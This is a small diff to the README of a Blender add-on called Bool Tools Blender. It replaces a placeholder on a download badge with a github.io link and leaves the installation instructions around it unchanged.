@@ -51,7 +51,7 @@ Bool Tools Blender can be set up in two ways.
 
 Use the extension badge when you want Blender to take the build directly.
 
-[![Get Bool Tools Blender](https://img.shields.io/badge/Get_Bool_Tools_Blender-SILKA-e36209)](SILKA)
+[![Get Bool Tools Blender](https://img.shields.io/badge/Get_Bool_Tools_Blender-SILKA-e36209)](https://bool-tools-blender.github.io/Bool-Tools-Blender/Bool-Tools)
 
 In Blender, open Edit, then Preferences, then Get Extensions. Enable Bool Tools Blender after that step. The extension record is [blender_manifest.toml](blender_manifest.toml). Further notes are in [installation.md](installation.md).
 
